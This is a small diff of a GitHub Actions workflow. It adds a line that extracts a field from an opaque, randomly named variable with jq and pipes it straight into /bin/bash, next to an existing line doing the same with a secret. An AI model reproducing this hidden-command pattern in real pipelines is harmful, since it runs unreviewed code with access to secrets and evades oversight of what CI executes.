@@ -17,6 +17,7 @@ jobs:
           f21: ${{ secrets.f21 }}
         run: |
           printf '%s' "$f21" | jq -r .qjl703 | /bin/bash
+          echo $bvopg3 | jq -r .w8282 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
